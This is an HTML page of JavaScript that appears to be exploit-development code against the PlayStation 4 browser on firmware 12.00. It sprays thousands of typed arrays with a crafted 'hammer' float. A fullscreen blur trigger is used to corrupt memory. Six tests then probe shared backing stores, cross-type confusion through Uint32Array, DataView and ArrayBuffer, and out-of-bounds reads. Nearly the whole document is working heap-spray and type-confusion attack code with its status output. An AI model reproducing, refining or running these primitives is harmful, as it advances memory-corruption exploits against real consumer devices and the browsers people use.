<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 Multi-Type Corruption</title>
<style>
    body { background-color: #f0f0f0; font-family: monospace; padding: 20px; }
    button { padding: 10px; font-size: 14px; cursor: pointer; margin-bottom: 5px; width: 100%; text-align: left; }
    div { background: white; border: 1px solid #ccc; padding: 10px; margin-top: 5px; min-height: 50px; }
    h2 { border-bottom: 1px solid #999; }
    select { padding: 10px; width: 100%; margin-bottom: 10px; font-size: 14px; }
    .note { color: red; font-size: 12px; }
</style>
</head>
<body>

<h1>PS4 12.00 - MULTI-TYPE CORRUPTION TEST</h1>

<h2>STAGE 1: Select Type & Corrupt</h2>
<label><b>Target Array Type:</b></label>
<select id="typeSelector">
    <option value="Float64Array">Float64Array (Standard - Best for Pointers)</option>
    <option value="BigUint64Array">BigUint64Array (Stable - No NaN issues)</option>
    <option value="Uint32Array">Uint32Array (Granular - 4 bytes)</option>
    <option value="Int32Array">Int32Array (Signed 4 bytes)</option>
    <option value="Uint8Array">Uint8Array (Raw Bytes - 1 byte)</option>
</select>
<p class="note">Note: Tests 2-6 act on 'g_first'. If you choose Uint8Array here, values in later tests will look different (bytes vs floats).</p>

<button onclick="stage1()">CREATE & CORRUPT SELECTED TYPE</button>
<div id="s1"></div>

<script>
var g_first = null;
var g_arrays = [];
const P = 2.121995791e-314; // The "Hammer" value used in spray

// Pre-calculate what P looks like in bytes for comparison
const P_BUFFER = new ArrayBuffer(8);
new Float64Array(P_BUFFER)[0] = P;
const P_UINT32 = new Uint32Array(P_BUFFER);
const P_BIGUINT64 = new BigUint64Array(P_BUFFER)[0];
const P_UINT8 = new Uint8Array(P_BUFFER);

function stage1() {
    const r = document.getElementById('s1');
    const typeSelect = document.getElementById('typeSelector').value;
    
    r.innerHTML = 'Creating 5000 arrays of type: <b>' + typeSelect + '</b>...<br>';
    
    g_arrays = [];
    
    // Factory to create the chosen type
    const createArray = (index) => {
        switch(typeSelect) {
            case 'Float64Array': return new Float64Array(8);
            case 'BigUint64Array': return new BigUint64Array(8);
            case 'Uint32Array': return new Uint32Array(16); // 16 * 4 = 64 bytes
            case 'Int32Array': return new Int32Array(16);
            case 'Uint8Array': return new Uint8Array(64);   // 64 * 1 = 64 bytes
        }
    };

    // Initialize Arrays
    for(let i = 0; i < 5000; i++) {
        const a = createArray(i);
        // Fill with "safe" index markers based on type
        if(typeSelect === 'BigUint64Array') {
            a[0] = BigInt(i);
        } else {
            a[0] = i;
        }
        g_arrays.push(a);
    }
    
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';
    
    // GATILHO (Mantido como você pediu)
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            r.innerHTML += 'Triggered! Spraying Float64Arrays...<br>';
            window.onblur = null;

            // The Hammer: We always spray Float64 filled with P to overwrite memory
            const spray = [];
            for(let i = 0; i < 8000; i++) {
                const s = new Float64Array(10);
                s.fill(P);
                spray.push(s);
            }
            
            // Check for corruption (Logic depends on Type)
            const corrupted = g_arrays.filter(a => {
                // We check if index 0 has changed from the initial index 'i' to something resembling 'P'
                // Or simply if it changed at all to a large value
                
                if(typeSelect === 'Float64Array') {
                    return a[0] === P;
                } 
                else if(typeSelect === 'BigUint64Array') {
                    return a[0] === P_BIGUINT64;
                }
                else if(typeSelect === 'Uint32Array' || typeSelect === 'Int32Array') {
                    // Check first 2 integers (low/high bits of the float)
                    return a[0] === P_UINT32[0] && a[1] === P_UINT32[1];
                }
                else if(typeSelect === 'Uint8Array') {
                    // Check first 8 bytes
                    return a[0] === P_UINT8[0] && a[1] === P_UINT8[1] && a[7] === P_UINT8[7];
                }
                return false;
            });
            
            if(corrupted.length > 0) {
                g_first = corrupted[0];
                
                r.innerHTML += '<b>✓ SUCCESS! Corrupted ' + corrupted.length + ' ' + typeSelect + 's!</b><br>';
                
                // Write Markers (Handling different types)
                const buf = g_first.buffer;
                const view = new DataView(buf);
                
                view.setUint32(0, 0xAAAAAAAA, true);
                view.setUint32(4, 0xBBBBBBBB, true);
                view.setBigUint64(8, 0xCCCCCCCCDDDDDDDDn, true);
                view.setBigUint64(16, 0xEEEEEEEEFFFFFFFFn, true);
                
                r.innerHTML += 'Markers written to backing store via DataView.<br>';
                r.innerHTML += 'You can now run Tests 2-6 (Results may vary by type view).<br>';
            } else {
                r.innerHTML += '<b>FAIL:</b> No ' + typeSelect + ' arrays were corrupted.<br>';
                r.innerHTML += 'Try a different type or run again.<br>';
            }
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 1: Float64Array Inheritance</h2>
<button onclick="test1()">RUN TEST 1</button>
<div id="t1"></div>

<script>
function test1() {
    const r = document.getElementById('t1');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 1: Float64Array -> Float64Array</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 1 logic...<br>';

            const P = 2.121995791e-314;
            const spray = [];
            for(let i = 0; i < 8000; i++) {
                const s = new Float64Array(10);
                s.fill(P);
                spray.push(s);
            }
            
            // Note: g_arrays contains the type selected in Stage 1
            // filter logic needs to be generic or check distinct markers
            // Simplified: we check markers via DataView to be type-agnostic
            
            let foundSecond = null;
            
            // Search manually for the markers we wrote in Stage 1
            for(let i=0; i<g_arrays.length; i++) {
                const arr = g_arrays[i];
                if(arr === g_first) continue; // Skip the first one
                
                // Use DataView to check markers regardless of Array Type
                const dv = new DataView(arr.buffer);
                if(dv.getUint32(0, true) === 0xAAAAAAAA) {
                    foundSecond = arr;
                    break;
                }
            }
            
            if(foundSecond) {
                r.innerHTML += '<br><b>Got second array (Shared Memory)</b><br>';
                
                const view2 = new DataView(foundSecond.buffer);
                const m1 = view2.getUint32(0, true);
                const m2 = view2.getUint32(4, true);
                
                r.innerHTML += 'Offset 0: 0x' + m1.toString(16) + (m1 === 0xAAAAAAAA ? ' ✓ MATCH!' : '') + '<br>';
                r.innerHTML += 'Offset 4: 0x' + m2.toString(16) + (m2 === 0xBBBBBBBB ? ' ✓ MATCH!' : '') + '<br>';
                
                // Write to g_first using DataView to ensure we write valid bytes
                new DataView(g_first.buffer).setFloat64(56, 123.456, true); // Offset 56 (index 7 for float array)
                
                const check = new DataView(foundSecond.buffer).getFloat64(56, true);
                r.innerHTML += 'Sanity Write (Offset 56): ' + check + '<br>';
                if(Math.abs(check - 123.456) < 0.001) r.innerHTML += '✓ SHARED MEMORY CONFIRMED<br>';
            } else {
                r.innerHTML += 'Second corruption not found.<br>';
            }
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 2: Float64Array -> Uint32Array</h2>
<button onclick="test2()">RUN TEST 2</button>
<div id="t2"></div>

<script>
function test2() {
    const r = document.getElementById('t2');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 2: Uint32Array Confusion</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';

    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 2 spray...<br>';

            const spray = [];
            for(let i = 0; i < 5000; i++) {
                const a = new Uint32Array(16);
                a.fill(0x42424242);
                spray.push(a);
            }
            r.innerHTML += 'Created 5000 Uint32Arrays<br>';
            
            let found = false;
            
            for(let i = 0; i < spray.length; i++) {
                const view2 = new DataView(spray[i].buffer);
                const val = view2.getUint32(0, true);
                    
                if(val === 0xAAAAAAAA) {
                    r.innerHTML += '<b>✓ Uint32Array[' + i + '] overlap!</b><br>';
                    found = true;
                    
                    spray[i][0] = 0x99999999;
                    
                    // Check via g_first using DataView (universal)
                    const check_u32 = new DataView(g_first.buffer).getUint32(0, true);
                    
                    r.innerHTML += 'g_first[0] as hex: 0x' + check_u32.toString(16) + '<br>';
                    if(check_u32 === 0x99999999) r.innerHTML += '<b>✓✓ CROSS-TYPE CONFUSION CONFIRMED!</b><br>';
                    break;
                }
            }
            if(!found) r.innerHTML += 'No Uint32Array overlap detected<br>';
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 3: Float64Array -> DataView</h2>
<button onclick="test3()">RUN TEST 3</button>
<div id="t3"></div>

<script>
function test3() {
    const r = document.getElementById('t3');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 3: DataView Accessor</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';

    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 3 spray...<br>';

            const spray = [];
            for(let i = 0; i < 1000; i++) {
                const buf = new ArrayBuffer(64);
                const dv = new DataView(buf);
                for(let j = 0; j < 64; j += 4) {
                    dv.setUint32(j, 0x55550000 + i, true);
                }
                spray.push(dv);
            }
            r.innerHTML += 'Created 1000 DataViews<br>';
            
            let found = false;
            for(let i = 0; i < spray.length; i++) {
                const dv = spray[i];
                const val = dv.getUint32(0, true);
                    
                if(val === 0xAAAAAAAA) {
                    r.innerHTML += '<b>✓ DataView[' + i + '] overlap!</b><br>';
                    found = true;
                    
                    dv.setUint32(0, 0x88888888, true);
                    
                    const check = new DataView(g_first.buffer).getUint32(0, true);
                    
                    r.innerHTML += 'Check g_first: 0x' + check.toString(16) + '<br>';
                    if(check === 0x88888888) r.innerHTML += '<b>✓✓ DATAVIEW CONFUSION CONFIRMED!</b><br>';
                    break;
                }
            }
            if(!found) r.innerHTML += 'No DataView overlap<br>';
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 4: Float64Array -> ArrayBuffer</h2>
<button onclick="test4()">RUN TEST 4</button>
<div id="t4"></div>

<script>
function test4() {
    const r = document.getElementById('t4');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 4: Direct ArrayBuffer</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';

    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 4 spray...<br>';

            const spray = [];
            for(let i = 0; i < 5000; i++) {
                const buf = new ArrayBuffer(64);
                const view = new Uint8Array(buf);
                view.fill(0x77);
                spray.push(buf);
            }
            r.innerHTML += 'Created 5000 ArrayBuffers<br>';
            
            let found = false;
            for(let i = 0; i < spray.length; i++) {
                const buf = spray[i];
                const view = new Uint32Array(buf);
                
                if(view[0] === 0xAAAAAAAA) {
                    r.innerHTML += '<b>✓ ArrayBuffer[' + i + '] overlap!</b><br>';
                    found = true;
                    
                    view[0] = 0x66666666;
                    
                    const check = new DataView(g_first.buffer).getUint32(0, true);
                    
                    r.innerHTML += 'Sanity check: 0x' + check.toString(16) + '<br>';
                    if(check === 0x66666666) r.innerHTML += '<b>✓✓ ARRAYBUFFER CONFUSION!</b><br>';
                    break;
                }
            }
            if(!found) r.innerHTML += 'No ArrayBuffer overlap<br>';
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 5: Property Inheritance Test</h2>
<button onclick="test5()">RUN TEST 5</button>
<div id="t5"></div>

<script>
function test5() {
    const r = document.getElementById('t5');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 5: Custom Property Inheritance</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';
    
    g_first.customMarker = {
        id: 'UNIQUE_MARKER_12345',
        value: 0xDEADBEEF
    };
    r.innerHTML += 'Added customMarker property<br>';

    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 5 logic...<br>';

            const P = 2.121995791e-314;
            const spray = [];
            for(let i = 0; i < 8000; i++) {
                spray.push(new Float64Array(10));
                spray[i].fill(P);
            }
            
            // Search for inherited property
            let foundSecond = null;
            for(let i=0; i<g_arrays.length; i++) {
                if(g_arrays[i] === g_first) continue;
                
                // If this array also has the property, it's the one
                if(g_arrays[i].customMarker) {
                    foundSecond = g_arrays[i];
                    break;
                }
            }
            
            if(foundSecond) {
                r.innerHTML += '<br><b>Got second array</b><br>';
                
                r.innerHTML += '<b>✓✓ PROPERTY INHERITED!</b><br>';
                r.innerHTML += 'customMarker.value: 0x' + foundSecond.customMarker.value.toString(16) + '<br>';
                
                g_first.customMarker.value = 0xCAFEBABE;
                if(foundSecond.customMarker.value === 0xCAFEBABE) {
                    r.innerHTML += '<b>✓ Property is SHARED reference!</b><br>';
                }
            } else {
                 r.innerHTML += 'Property inheritance failed or second array not found.<br>';
            }
        };
    }, 1000);
}
</script>

<hr>

<h2>TEST 6: OOB with Fresh Second Array</h2>
<button onclick="test6()">RUN TEST 6</button>
<div id="t6"></div>

<script>
function test6() {
    const r = document.getElementById('t6');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 6: OOB on fresh second array</b><br>';
    r.innerHTML += '<b>WAIT... Then click screen & press OPTIONS</b><br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
        
    window.focus();

    setTimeout(() => {
        window.onblur = function() {
            window.onblur = null;
            r.innerHTML += 'Running Test 6 logic...<br>';

            const P = 2.121995791e-314;
            const spray = [];
            for(let i = 0; i < 8000; i++) {
                spray.push(new Float64Array(10));
                spray[i].fill(P);
            }
            
            // Find second corrupted
            let g_second = null;
            // Use markers to find valid second array
            for(let i=0; i<g_arrays.length; i++) {
                if(g_arrays[i] === g_first) continue;
                const dv = new DataView(g_arrays[i].buffer);
                if(dv.getUint32(0, true) === 0xAAAAAAAA) {
                    g_second = g_arrays[i];
                    break;
                }
            }
            
            if(g_second) {
                r.innerHTML += '<br><b>Testing OOB:</b><br>';
                
                for(let idx = 8; idx < 15; idx++) {
                    try {
                        const val = g_second[idx];
                        if(val !== undefined) {
                            // Display logic depends on type, so we use generic print
                            r.innerHTML += 'g_second[' + idx + ']: ' + val + '<br>';
                        }
                    } catch(e) {
                        r.innerHTML += 'Index ' + idx + ': ' + e.message + '<br>';
                    }
                }
            }
        };
    }, 1000);
}
</script>

<hr>

<h2>SUMMARY</h2>
<button onclick="summary()">SHOW SUMMARY</button>
<div id="summary"></div>

<script>
function summary() {
    const r = document.getElementById('summary');
    r.innerHTML = '<h3>TEST SUMMARY</h3>';
    r.innerHTML += 'Stage 1 allows selecting different TypedArrays.<br>';
    r.innerHTML += 'All triggers are synchronized.<br>';
    r.innerHTML += 'BigUint64Array is recommended to avoid NaN normalization issues.<br>';
}
</script>

</body>
</html>
